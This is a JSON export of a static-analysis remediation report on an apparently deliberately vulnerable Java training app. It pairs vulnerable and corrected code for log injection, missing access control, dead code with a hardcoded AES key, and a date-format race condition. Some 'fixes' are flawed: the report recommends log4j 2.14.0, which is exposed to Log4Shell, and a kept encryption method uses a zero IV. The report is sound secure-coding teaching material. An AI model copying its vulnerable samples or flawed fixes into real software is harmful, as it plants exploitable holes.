validateLogin(@ModelAttribute LoginBean bean, HttpServletRequest request,HttpSession sess, HttpServletResponse response)\n\t{\n\t\tString uname = request.getParameter(&quot;uname&quot;);\n\t\tString password = request.getParameter(&quot;pwd&quot;);\n\t\tlogger.debug(&quot;User Login with username&quot;+uname);\n\t\t\t\n\t\tfinal String[] passwdArray = { null };\n\t\tGuardedString gs = new GuardedString(request.getParameter(&quot;pwd&quot;).toCharArray());\n\t\tgs.access(new GuardedString.Accessor() {\n\n            @Override\n            public void access(char[] decryptedChars) {\n                if (!(new String(decryptedChars)).equals(request.getParameter(&quot;pwd&quot;))) {\n                    System.out.println(&quot;Decrypted chars&quot;+decryptedChars);\n                } \n                \tpasswdArray[0] = new String(decryptedChars);\n            }\n        });\n\t\t\n\t\tchar[] chars = (request.getParameter(&quot;pwd&quot;).toCharArray());\n\t\tfor (int i = 0; i &lt; chars.length; i++)\n\t\t\tchars[i] = '\\0';\n\t\t\n\t\tbean=new LoginBean();\n\t\tbean.setUserName(uname);\n\t\tbean.setPassword(request.getParameter(&quot;pwd&quot;));\n.....\n}", "comments": "By using log4j2 logging will be protected against XSS attack, since log4j 2 escapes special characters (eg \\r, \\n) to their HTML Entities.\nIf the application is already using slf4j, log4j needs to be excluded from slf4j and separate log4j2 dependecy needs to be added like below.\n\nReference: \nhttps://logging.apache.org/log4j/2.x/index.html\nhttps://issues.apache.org/jira/browse/LOG4J2-439\n\n<em class=\"bold\">Pom.xml</em> //dependency changes\n&lt;dependency&gt;\n\t      &lt;groupId&gt;org.slf4j&lt;/groupId&gt;\n\t      &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt;\n\t      &lt;version&gt;1.7.19&lt;/version&gt;\n\t     <em class=\"blue\"> &lt;exclusions&gt;\n\t\t    &lt;exclusion&gt;\n\t\t        &lt;groupId&gt;org.slf4j&lt;/groupId&gt;\n\t\t        &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt;\n\t\t    &lt;/exclusion&gt;\n\t\t    &lt;exclusion&gt;\n\t\t        &lt;groupId&gt;log4j&lt;/groupId&gt;\n\t\t        &lt;artifactId&gt;log4j&lt;/artifactId&gt;\n\t\t    &lt;/exclusion&gt;\n\t\t\t&lt;/exclusions&gt;  \n</em>\t    &lt;/dependency&gt;\n\t\t\n\t\t&lt;dependency&gt;\n\t\t    <em class=\"blue\">&lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\n\t\t    &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;\n</em>\t\t    &lt;version&gt;2.14.0&lt;/version&gt;\n\t\t  &lt;/dependency&gt;\n\t\t  &lt;dependency&gt;\n\t\t<em class=\"blue\">    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\n\t\t    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</em>\n\t\t    &lt;version&gt;2.14.0&lt;/version&gt;\n\t\t  &lt;/dependency&gt;", "impact": "There are few things to consider while changing to log4j2.\n1) Apache log4j2 is not compatible with previous versions.\n2) XML configuration is simplified in log4j2 and is not compatible with log4j 1.x.\n3) The log entries created by log4j2, may have a different formating than log4j. Make sure to align the entries formatting, or align the changes with all automated system reading/using the generated logs (e.g.: rsyslog; Load balance; application monitoring; SIEM integrations; backup procedures; ETL; ...)\n\nFind the detailed list below:\nhttps://logging.apache.org/log4j/2.x/changelog.html", "abstract": "Use of log4j2"}, {"@type": "JAVA/JSP", "vulncode": "import org.slf4j.Log<em class=\"red\">ger;</em>\npublic ModelAndView validateLogin(@ModelAttribute LoginBean bean, HttpServletRequest request,HttpSession sess, HttpServletResponse response)\n\t{\n\t\tString uname = request.getParameter(&quot;uname&quot;);\n\t\tString password = request.getParameter(&quot;pwd&quot;);\n\t\t<em class=\"red\">logger.debug(&quot;User Login with username&quot;+uname);</em>\n\t\t\t\n\t\tfinal String[] passwdArray = { null };\n\t\tGuardedString gs = new GuardedString(request.getParameter(&quot;pwd&quot;).toCharArray());\n\t\tgs.access(new GuardedString.Accessor() {\n\n            @Override\n            public void access(char[] decryptedChars) {\n                if (!(new String(decryptedChars)).equals(request.getParameter(&quot;pwd&quot;))) {\n                    System.out.println(&quot;Decrypted chars&quot;+decryptedChars);\n                } \n                \tpasswdArray[0] = new String(decryptedChars);\n            }\n        });\n\t\t\n\t\tchar[] chars = (request.getParameter(&quot;pwd&quot;).toCharArray());\n\t\tfor (int i = 0; i &lt; chars.length; i++)\n\t\t\tchars[i] = '\\0';\n\t\t\n\t\tbean=new LoginBean();\n\t\tbean.setUserName(uname);\n\t\tbean.setPassword(request.getParameter(&quot;pwd&quot;));\n.....\n}", "nonvulncode": "public ModelAndView validateLogin(@ModelAttribute LoginBean bean, HttpServletRequest request,HttpSession sess, HttpServletResponse response)\n\t{\n\t\tString uname = request.getParameter(&quot;uname&quot;);\n\t\tString password = request.getParameter(&quot;pwd&quot;);\n\t\tlogger.debug(&quot;User Login with username&quot;<em class=\"blue\">+Encode.forHtmlAttribute(uname)</em>);\n\t\t\t\n\t\tfinal String[] passwdArray = { null };\n\t\tGuardedString gs = new GuardedString(request.getParameter(&quot;pwd&quot;).toCharArray());\n\t\tgs.access(new GuardedString.Accessor() {\n\n            @Override\n            public void access(char[] decryptedChars) {\n                if (!(new String(decryptedChars)).equals(request.getParameter(&quot;pwd&quot;))) {\n                    System.out.println(&quot;Decrypted chars&quot;+decryptedChars);\n                } \n                \tpasswdArray[0] = new String(decryptedChars);\n            }\n        });\n\t\t\n\t\tchar[] chars = (request.getParameter(&quot;pwd&quot;).toCharArray());\n\t\tfor (int i = 0; i &lt; chars.length; i++)\n\t\t\tchars[i] = '\\0';\n\t\t\n\t\tbean=new LoginBean();\n\t\tbean.setUserName(uname);\n\t\tbean.setPassword(request.getParameter(&quot;pwd&quot;));\n.....\n}", "comments": "There is possible way to use specific libraries to perform the encoding, like by use OWASP Java Encoder project Encode.forHtmlAttribute(String input) method. There are varied option like forHtmlAttribute, forHtmlContent, forJava, forJavaScript, forUri etc, depending on the requirement appropriate encoder needs to be used. \n\nFor reference: https://owasp.org/www-project-java-encoder/\n\n<em class=\"bold\">Dependency to be added in pom.xml</em>\n&lt;dependency&gt;\n\t&lt;groupId&gt;org.owasp.encoder&lt;/groupId&gt;\n\t&lt;artifactId&gt;encoder&lt;/artifactId&gt;\n\t&lt;version&gt;1.2.2&lt;/version&gt;\n&lt;/dependency&gt;\n\n<em class=\"bold\">//Import statement to be added</em>\nimport org.owasp.encoder.Encode;\n\nNOTE: The use of Encoder is a valid solution, but some SAST security tools may still flag as a vulnerability. In this case, the fixed code can be considered a false positive.", "impact": "The use of Encoder is a valid solution, but some SAST security tools may still flag as a vulnerability. In this case, the fixed code can be considered a false positive.\n\nImpact in performance is negligible, but requires a set of tests with special characters (e.g., Name=Ad\u00e3o will be encoded as Ad&atilde;o. The regression test must look at how this will propagate back to the database in case the user is editing another value and the name will change after the encoding is put in place).\nTest scenarios with special chars must be included into the test scripts: Understand the possible special characters that may be used by the normal software functionalities, and develop a strategy to present those properly.\nAdd Owasp_Java_Encoder to the artifact list.", "abstract": "Using OWASP encoder"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Access Control: Database": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/dao/EmployeeDAOImpl.java", "items": [{"id": "IN00354", "function": "javax.persistence.criteria.CriteriaBuilder.like()", "line": "208", "snippet": "if(optSearch.isPresent() && employeeSearch.getEmpName()!=null && !employeeSearch.getEmpName().isEmpty()) {\n\t\t\tcr.select(root).where(cb.like(root.get(\"empName\"), \"%\" + employeeSearch.getEmpName() + \"%\"));\n\t\t} else {\n\t\t\tcr.select(root);"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00355", "function": "java.sql.PreparedStatement.setString()", "line": "142", "snippet": "stmt = conn.prepareStatement(sql);\n\t\t\t\tfor(HashMap.Entry<String,String> entry : remediationparamList.entrySet()){\n\t\t\t\t    stmt.setString(Integer.parseInt(entry.getKey()), entry.getValue());\n\t\t\t\t}\n\t\t\t\tResultSet rs = stmt.executeQuery();"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00356", "function": "java.sql.PreparedStatement.setString()", "line": "142", "snippet": "stmt = conn.prepareStatement(sql);\n\t\t\t\tfor(HashMap.Entry<String,String> entry : remediationparamList.entrySet()){\n\t\t\t\t    stmt.setString(Integer.parseInt(entry.getKey()), entry.getValue());\n\t\t\t\t}\n\t\t\t\tResultSet rs = stmt.executeQuery();"}]}, {"file": "src/com/accenture/sec/dao/EmployeeDAOImpl.java", "items": [{"id": "IN00357", "function": "javax.persistence.criteria.CriteriaBuilder.like()", "line": "208", "snippet": "if(optSearch.isPresent() && employeeSearch.getEmpName()!=null && !employeeSearch.getEmpName().isEmpty()) {\n\t\t\tcr.select(root).where(cb.like(root.get(\"empName\"), \"%\" + employeeSearch.getEmpName() + \"%\"));\n\t\t} else {\n\t\t\tcr.select(root);"}]}], "remediation": {"remediation": {"@id": "R.0028", "@name": "Access Control: Database", "@dateLastModified": "11/19/2020", "faqs": {"faq": {"question": "</em> I already put in place all restrictions required to solve this issue, but SAST keeps pointing me this one. Why?", "answer": "<em class=\"bold\"> </em>The SAST tools will notify this vulnerability even after applying fixes. This is due to the fact the SAST tool is unable to check to completeness of the solution. If you want to test if the vulnerability is properly fixed, you can request a penetration test on the application."}}, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "<em class=\"bold\">Controller:</em>\npublic ActionResult StudentGrade(string Username)\n{\n        var queryResult = (from subject in context.Subjects\n                            join grade in context.StudentSubjectGrades\n                            on subject.SubjectID equals grade.SubjectID\n                            where grade.Username == Username\n                            select new StudentGradeVM\n                            {\n                                Username = grade.Username,\n                                Description = subject.Description,\n                                InstructorID = grade.InstructorID,\n                                Grade = grade.Grade\n                            }).ToList();\n        return View(queryResult);\n}", "nonvulncode": "<em class=\"bold\">Controller:</em>\n<em class=\"blue\">[Authorize(&quot;Student&quot;)]</em>\npublic ActionResult StudentGrade(string Username)\n{\n<em class=\"blue\">// avoid a student for retrieving grades from another student\n    if (Username == Session[&quot;user&quot;].ToString()) </em>\n    {\n        var queryResult = (from subject in context.Subjects\n                            join grade in context.StudentSubjectGrades\n                            on subject.SubjectID equals grade.SubjectID\n                            where grade.Username == U<em class=\"blue\">sername</em>\n                            select new StudentGradeVM\n                            {\n                                Username = grade.Username,\n                                Description = subject.Description,\n                                InstructorID = grade.InstructorID,\n                                Grade = grade.Grade\n                            }).ToList();\n        return View(queryResult);\n    }\n    else\n    {\n        return Redirect(&quot;../Home/Unauthorized&quot;);\n    }\n}", "comments": "By enforcing the &lt;authorize&gt; declarator, the code will prevent access from different groups. \nAlways add functionalities to enforce any business required validation and limit the access. In the vulnerable example, a student is able to retrieve grades from any group. By adding the &lt;Authorize&gt; declarator, the student will be limited to the 'Student group', but can still access grades from other students, and by adding the authenticated Session properties check, the access will be limited to only the grade owner.\nAccess restriction should be enforced by the code. Create entitlements that restrict access to data, information and transaction only to the defined groups or users.\nFor critical functionalities, implement a step-up authentication confirmation before executing the transaction. \n\nThis approach is using the following DB tables generated by ASP. Below are the tables.\n- AspNetRoles\n- AspNetUserLogins\n- AspNetUserRoles\n- AspNetUsers", "impact": "The developer needs to understand the business requirements, create strategies (e.g. using session properties stored on the server) and put in place those enforcement rules. Do not enforce by using any property sent by the browser only.", "abstract": "using Authorize"}, {"@type": ".NET/C#/ASP", "vulncode": "<em class=\"bold\">Controller:</em>\npublic ActionResult StudentGrade(string Username)\n{\n        var queryResult = (from subject in context.Subjects\n                            join grade in context.StudentSubjectGrades\n                            on subject.SubjectID equals grade.SubjectID\n                            where grade.Username == Username\n                            select new StudentGradeVM\n                            {\n                                Username = grade.Username,\n                                Description = subject.Description,\n                                InstructorID = grade.InstructorID,\n                                Grade = grade.Grade\n                            }).ToList();\n        return View(queryResult);\n}", "nonvulncode": "[CustomAuthorize(&quot;St<em class=\"blue\">udent&quot;)]\n</em>public ActionResult StudentGrade(string Username)\n{\n<em class=\"blue\">// avoid a student for retrieving grades from another student</em>\n  <em class=\"blue\"> if (Username == Session[&quot;user&quot;].ToString())</em>\n   {\n        var queryResult = (from subject in context.Subjects\n              join grade in context.StudentSubjectGrades\n              on subject.SubjectID equals grade.SubjectID\n              where <em class=\"blue\">grade.Username == Username</em>\n              select new StudentGradeVM\n              {   \n                Username = grade.Username,\n                Description = subject.Description,\n                InstructorID = grade.InstructorID,\n                Grade = grade.Grade,\n                isFound = true\n                }).ToList();\n                return View(queryResult);\n    }\n    else\n    {\n         return Redirect(&quot;../Home/Unauthorized&quot;);\n    }\n}", "comments": "If you want to have a full control or you have a design that doesn't fit with the default (using the Authorized attribute). With this approach you need to have your own table design based on your requirement and you need to create a class that inherit the <em class=\"bold\">AuthorizeAttribute</em> class and implement your custom authorization.", "impact": "The developer needs to understand the business requirements, create strategies (e.g. using session properties stored on the server) and put in place those enforcement rules. Do not enforce by using any property sent by the browser only.", "abstract": "using CustomAuthorize"}, {"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">StudentController:</em>\nlogger.debug(&quot;Enter StudentSubjectGradeList&quot;);\n\t\t......\n<em class=\"red\">//student detail returned without any check</em>\n\t\t      \t\t\tList&lt;StudentSubjectGradeBean&gt; listStudents= studentDAO.getStudentSubjectGradeList(studentSubjectGrade.getUserName());\n\t\t\t\t\n\t\t\n\t\treturn new ModelAndView(&quot;listStudentGrade&quot;,&quot;listStudentSubject&quot;,listStudents);\n\n<em class=\"bold\">DAO:</em>\npublic List&lt;StudentSubjectGradeBean&gt; getStudentSubjectGradeList(String userName) {\t\n\t\tEntityManager em=entityManagerFactory.createEntityManager();\n\t\t\n\t\t.....\t\n\t\tCriteriaBuilder cb = em.getCriteriaBuilder();\n\t\tCriteriaQuery&lt;StudentSubjectGradeEntity&gt; cr = cb.createQuery(StudentSubjectGradeEntity.class); \n\t\tRoot&lt;StudentSubjectGradeEntity&gt; root = cr.from(StudentSubjectGradeEntity.class);\n\t\t\n\t\tif(userName!=null) {\n\t\t\tcr.select(root).where(cb.equal(root.get(&quot;userName&quot;), userName));\n\t\t} else {\n\t\t\tcr.select(root);\n\t\t}\n.....\n}", "nonvulncode": "<em class=\"bold\">StudentController:</em>\nlogger.debug(&quot;Enter StudentSubjectGradeList&quot;);\n\t\t......\nString userName = (String) session.getAttribute(&quot;userName&quot;);\nString userRole = (String) session.getAttribute(&quot;userRole&quot;);\n<em class=\"blue\">//Ensuring role check and whether user is authorized to view details\n</em>\t\t<em class=\"blue\">if(&quot;ROLE_USER&quot;.equals(userRole) && userName.equals(studentSubjectGrade.getUserName())) { </em>\n\t\t\tlistStudents= studentDAO.getStudentSubjectGradeList(studentSubjectGrade.getUserName());\n\t\t} else {\n\t\t\t<em class=\"blue\">return new ModelAndView(&quot;listStudentGrade&quot;,&quot;msg&quot;,&quot;Not authorized to view other students detail&quot;);</em>\n\t\t}\n\t\t\n<em class=\"bold\">DAO:</em>\npublic List&lt;StudentSubjectGradeBean&gt; getStudentSubjectGradeList(String userName) {\t\n\t\tEntityManager em=entityManagerFactory.createEntityManager();\n\t\t\n\t\t.....\t\n\t\tCriteriaBuilder cb = em.getCriteriaBuilder();\n\t\tCriteriaQuery&lt;StudentSubjectGradeEntity&gt; cr = cb.createQuery(StudentSubjectGradeEntity.class); \n\t\tRoot&lt;StudentSubjectGradeEntity&gt; root = cr.from(StudentSubjectGradeEntity.class);\n\t\t\n\t\tif(userName!=null) {\n\t\t\t<em class=\"blue\">cr.select(root).where(cb.equal(root.get(&quot;userName&quot;), userName));</em>\n\t\t} else {\n\t\t\tcr.select(root);\n\t\t}\n.....\n}\n\t\treturn new ModelAndView(&quot;listStudentGrade&quot;,&quot;listStudentSubject&quot;,listStudents);", "comments": "In the vulnerable sample, student data has been accessed by user without restriction, also the input data is not validated which will lead to user viewing unauthorized data. User input should be validated before accessing database.\nThe overall execution should be similar to:\n1. Fill the user_role when user gets authenticated and save it on the server side (e.g., session). \nUser role check can also be done using spring security.\n2. Check on the DB, or on the server side session, if the role has entitlements for the functionality \n(e.g., \n     Role_STD can read own grades; \n     Role_ADM can read anyone's grades; \n     Role_PROF can write and read grades from anyone\n)\n3. Execute the command only if role has entitlement; Give an error (e.g., &quot;User permissions are not suficient to execute this query&quot;) otherwise.", "impact": "The developer needs to understand the business requirements, create strategies (e.g. using session properties stored on the server) and put in place those enforcement rules. Do not enforce by using any property sent by the browser only.", "abstract": "Use of role authorization and input validation"}]}, "mitigations": {"mitigation": [{"system": "Identity management system", "configuration": "OES (Oracle Entitlement Server)configuration", "backend": "N/A", "frontend": "N/A", "comments": "In the I&AM product, manage the user (credential to access), role (permissions to execute) and entitlements (application functionalities, granted to a role. Entitlements can be per transaction, or permission to execute a method, to instantiate an object, etc.). \n\nChange application to use entitlements from OES: OES will manage what application functionality is associated to each roles. The application needs to query OES agent to grant permission to the authenticated user to execute the functionality. The application needs to be changed and eliminate any entitlement check from the code, moving it all to OES.\n\nFor more reference, check https://docs.oracle.com/cd/E23943_01/security.1111/e14097/toc.htm"}, {"system": "API Gateway", "configuration": "N/A", "backend": "https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-resource-policies-examples.html", "frontend": "N/A", "comments": "For microservices / Kubernetes / modern applications, where an API gateway is in place, the policies must limit the access to the resources including the DB.\nConsider the following security concepts when implementing a microservices and API-based applications or services:\n  1. Maintain user-level E2E trust across the entire journey.\n  2. Ensure AuthZ is enforced at the right place with the right level of granularity. The entitlements (users on specific roles can make only specific calls to specific APIs. e.g, users part of role finance can call *readContract* microservice but not *generateVendor* )\n  3. Group your APIs and use an API gateway to apply configurable security policies consistently.\n  4. Don\u2019t forget to log, monitor and detect.\n  5. Follow a defense-in-depth strategy, and add security at all layers.\n\nReference: https://developer.ibm.com/devpractices/api/articles/securing-modern-api-and-microservices-apps-1/"}]}}}}, "Dead Code: Unused Method": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00362", "function": "Function: encryptAES()", "line": "387", "snippet": "* @return\n\t */\n\t//vul 125 and 132\n\tprivate String encryptAES(String password) {"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00363", "function": "Function: encryptWithHardcodedPwd()", "line": "454", "snippet": "}\n\t\n\tprivate String encryptWithHardcodedPwd(String password) {\n\t\tString encrypted=null;\n\t\ttry {"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00364", "function": "Function: encryptWithRSA()", "line": "514", "snippet": "* @return\n\t */\n\tprivate String encryptWithRSA(String pwd) {\n\t\tbyte[] cipherText =null;\n\t\tString encryptedText = null;"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00365", "function": "Function: checkZipEntryOverwrite()", "line": "340", "snippet": "}\n\t\n\tprivate void checkZipEntryOverwrite(File destinationDir, ZipEntry zipEntry) throws IOException {\n        File destFile = new File(destinationDir, zipEntry.getName());"}]}], "remediation": {"remediation": {"@id": "R.0006", "@name": "Dead Code: Unused Method", "@dateLastModified": "1/11/2021", "faqs": {"faq": {"question": "The method was implemented for a future functionality. How can this be a security risk?", "answer": "There is a trend on software to increase the complexity to read if a clean up is not made, making it harder to maintain and causing issues of calling methods that were not ment to be used. Those unused methods be required for unit test only, and not deployed in production, and in this cases, comments are important to explain why it is there, and when to be used."}}, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "public class DepartmentController : Controller\n    {\n\n public ActionResult Departments()\n{\n  //code goes here\n}\n\n<em class=\"red\">private int GetDepartmentId(string departmentName)</em>\n        {\n            int departmentId = 0;\n            SqlConnection con = new SqlConnection(ConfigurationManager.ConnectionStrings[&quot;VulnAppDBConnection&quot;].ConnectionString);\n\n            con.Open();\n            using (SqlCommand command = new SqlCommand(&quot;Select Id, Name From dbo.Department Where Name=@departmentName&quot;, con))\n            {\n                command.Parameters.Add(new SqlParameter(&quot;departmentName&quot;, departmentName));\n\n                SqlDataReader reader = command.ExecuteReader();\n                List&lt;Department&gt; listDepartments = new List&lt;Department&gt;();\n                while (reader.Read())\n                {\n                    departmentId = Convert.ToInt32(reader[&quot;Id&quot;]);   \n                }\n                con.Close();\n            }\n            return departmentId;\n        }\n\n    }\n\n    }", "nonvulncode": "public class DepartmentController : Controller\n    {\n\n public ActionResult Departments()\n{\n  //code goes here\n}\n<em class=\"blue\">//remove this method if not being used or put some comment at the top of the method that this is to be used but not now</em>\nprivate int GetDepartmentId(string departmentName)\n        {\n            int departmentId = 0;\n            SqlConnection con = new SqlConnection(ConfigurationManager.ConnectionStrings[&quot;VulnAppDBConnection&quot;].ConnectionString);\n\n            con.Open();\n            using (SqlCommand command = new SqlCommand(&quot;Select Id, Name From dbo.Department Where Name=@departmentName&quot;, con))\n            {\n                command.Parameters.Add(new SqlParameter(&quot;departmentName&quot;, departmentName));\n\n                SqlDataReader reader = command.ExecuteReader();\n                List&lt;Department&gt; listDepartments = new List&lt;Department&gt;();\n                while (reader.Read())\n                {\n                    departmentId = Convert.ToInt32(reader[&quot;Id&quot;]);   \n                }\n                con.Close();\n            }\n            return departmentId;\n        }\n\n    }\n\n    }", "comments": "Private method can only be accessible by the class itself. In case this is not being used, or is not necessary, it shoud be removed because it adds maintenability, cause confusion, and may be erroneously used by developers in the future.\nIf the method is for future use, provide comments explaining the exact functionality, and when it should be called &quot;method XXX calculates ... and is to be used in the future to add the ... functionality&quot;.", "impact": "No impact in removing unused method.", "abstract": "Removal of dead code."}, {"@type": "JAVA/JSP", "vulncode": "LoginController.java<em class=\"bold\">\n\n</em>public ModelAndView addUserProfile(@ModelAttribute(&quot;userProfile&quot;) UserProfileForm userProfile)\n\t{\n\t\tif(userProfile.getUserName()!=null) {\n\t\t\t// generate secret key using AES algorithm\n\t\t\tString encrypted = encryptAES(userProfile.getPwd());\n\t        userProfile.setEncryptionKey(encrypted);\n\t        userProfile = dao.addUserProfile(userProfile);\t\t\t\t\t\n  ......\n\t}\n\n<em class=\"red\">//private method remains unsued after fix is created with new method.</em>\nprivate String encryptWithHardcodedPwd(String password) {\n\t\tString encrypted=null;\n\t\ttry {\n\t\t\tfinal String encryptionKey = &quot;MyPasswordEncryption&quot;;\n\t\t \n\t\t\tbyte[] keyBytes = encryptionKey.getBytes();\n\t\t\tSecretKeySpec key = new SecretKeySpec(keyBytes, &quot;AES&quot;);\n\t\t\tCipher cipher = Cipher.getInstance(&quot;AES/ECB/PKCS5Padding&quot;);\n            cipher.init(Cipher.ENCRYPT_MODE, key);\n            encrypted= Base64.getEncoder().encodeToString(cipher.doFinal(password.getBytes(&quot;UTF-8&quot;)));\n                        \n\t\t} \n......\t\t\n\t\treturn encrypted;\n\t}\n\nprivate String encryptAES(String password) {\n\t\t\n\t\tString encrypted=null;\n\t\ttry {\n\t\t\tkey = KeyGenerator.getInstance(&quot;AES&quot;).generateKey();\n\t\t \n            ecipher = Cipher.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;);            \n            ecipher.init(Cipher.ENCRYPT_MODE, key, new IvParameterSpec(new byte[16]));        \n            byte[] enc = ecipher.doFinal(password.getBytes());       \n            encrypted = Base64.getEncoder().encodeToString(enc);\n            \n            ...\n}\n}", "nonvulncode": "LoginController.java<em class=\"bold\">\n\n</em>public ModelAndView addUserProfile(@ModelAttribute(&quot;userProfile&quot;) UserProfileForm userProfile)\n\t{\n\t\tif(userProfile.getUserName()!=null) {\n\t\t\t// generate secret key using AES algorithm\n\t\t\tString encrypted = encryptAES(userProfile.getPwd());\n\t        userProfile.setEncryptionKey(encrypted);\n\t        userProfile = dao.addUserProfile(userProfile);\t\t\t\t\t\n  ......\n\t}\n<em class=\"blue\">//remove the unused method.</em>\n\nprivate String encryptAES(String password) {\n\t\t\n\t\tString encrypted=null;\n\t\ttry {\n\t\t\tkey = KeyGenerator.getInstance(&quot;AES&quot;).generateKey();\n\t\t \n            ecipher = Cipher.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;);            \n            ecipher.init(Cipher.ENCRYPT_MODE, key, new IvParameterSpec(new byte[16]));        \n            byte[] enc = ecipher.doFinal(password.getBytes());       \n            encrypted = Base64.getEncoder().encodeToString(enc);\n            \n            ...\n}\n}", "comments": "Private method can only be accessible by the class itself. In case this is not being used, or is not necessary, it shoud be removed because it adds maintenability, cause confusion, and may be erroneously used by developers in the future.\nIf the method is for future use, provide comments explaining the exact functionality, and when it should be called &quot;method XXX calculates ... and is to be used in the future to add the ... functionality&quot;.", "impact": "No impact", "abstract": "Removal of dead code."}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Denial of Service: StringBuilder": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00366", "function": "java.lang.StringBuilder.append()", "line": "468", "snippet": "employeeSearch.setEmpName(name);\n\t        StringBuilder sb = new StringBuilder();\n\t        sb.append(name);\n\t        employeeSearch.setEmpName(name);"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00367", "function": "java.lang.StringBuffer.append()", "line": "200", "snippet": "String dbuser = prop.getProperty(\"sec_user\");\n\t\t\tString dbpwd = prop.getProperty(\"sec_password\");\n\t\t\tpassword.append(prop.getProperty(\"sec_password\"));"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00368", "function": "java.lang.StringBuffer.append()", "line": "1170", "snippet": "while ((inputLine = reader.readLine()) != null) {\n\t\t\tresponse.append(inputLine);\n\t\t}\n\t\treader.close();"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00369", "function": "java.lang.StringBuffer.append()", "line": "1170", "snippet": "while ((inputLine = reader.readLine()) != null) {\n\t\t\tresponse.append(inputLine);\n\t\t}\n\t\treader.close();"}]}], "remediation": null}, "Race Condition: Format Flaw": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/FormServlet.java", "items": [{"id": "IN00378", "function": "FunctionCall: format()", "line": "60", "snippet": "response.setHeader(\"BMI\", String.valueOf(bmi));\n            \n            String strDate = dateFormat.format(new Date());\n    \t\tSystem.out.println(\"String Date\"+strDate);"}]}, {"file": "src/com/accenture/sec/controller/FormServlet.java", "items": [{"id": "IN00379", "function": "FunctionCall: format()", "line": "27", "snippet": "public String format(Date date) {\n        return dateFormat.format(date);\n    }"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00380", "function": "FunctionCall: format()", "line": "152", "snippet": "UserAccountFormBean userAccounts = new UserAccountFormBean();\n\t\tuserAccounts.setUserAccounts(listUsers);\n\t\tString strDate = dateFormat.format(new Date());\n\t\tSystem.out.println(\"String Date\"+strDate);"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00381", "function": "FunctionCall: format()", "line": "91", "snippet": "public String format(Date date) {\n        return dateFormat.format(date);\n    }"}]}], "remediation": {"remediation": {"@id": "R.0062", "@name": "Race Condition: Format Flaw", "@dateLastModified": "2/26/2021", "faqs": {"faq": {"question": "But race condition cannot be exploited or used to get access to the application\u2026 Is this a code quality issue?", "answer": "Security objectives are to protect Conidentiality, Integrity and Availability (CIA). Race conditions can cause the values inside an application to be not correct, breaking the security principle of &quot;Integrity&quot;."}}, "recommendations": {"recommendation": [{"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">UserController.java</em>\n//class level definition of date format\nprivate static SimpleDateFormat dateFormat= new SimpleDateFormat(&quot;dd/MM/yyyy&quot;);\npublic ModelAndView addUser(@ModelAttribute(&quot;userAccountBean&quot;) UserAccountBean userAccountBean) throws SQLException, NamingException\n\t{\n\u2026.\nString strDate = dateFormat.format(new Date());\nuserAccountBean.setCreatedDate(strDate);\n....\n}", "nonvulncode": "UserController.java\n<em class=\"bold\">\n</em>private static final String DATE_FORMAT = &quot;dd/MM/yyyy&quot;;\npublic ModelAndView addUser(@ModelAttribute(&quot;userAccountBean&quot;) UserAccountBean userAccountBean) throws SQLException, NamingException\n\t{\n<em class=\"blue\">//Formatter defined at method level to avoid race condition</em>\n<em class=\"blue\">SimpleDateFormat dateFormat= new SimpleDateFormat(DATE_FORMAT);</em>\n\u2026.\nString strDate = dateFormat.format(new Date());\nuserAccountBean.setCreatedDate(strDate);\n....\n}", "comments": "According to the SimpleDateFormat definitions: Date formats are not synchronized. It is recommended to create separate format instances for each thread. If multiple threads access a format concurrently, it must be synchronized externally.\n\nWhen using SimpleDateFormat in a thread, there will be cases where the data may not be formatted correctly and this will propagate to some random records in the database (e.g. 1/2/21 may be stored as Jan 2nd, or Feb 1st depending to the race condition). \n\nTo avoid race conditions, change the date format as local variable. This way, the code blocks can be synchronized which will prevent data consistency issue.", "impact": "No impact", "abstract": "Use of local variable"}, {"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">UserController.java</em>\n//class level definition of date format\nprivate static SimpleDateFormat dateFormat= new SimpleDateFormat(&quot;dd/MM/yyyy&quot;);\npublic ModelAndView addUser(@ModelAttribute(&quot;userAccountBean&quot;) UserAccountBean userAccountBean) throws SQLException, NamingException\n\t{\n\u2026.\nString strDate = dateFormat.format(new 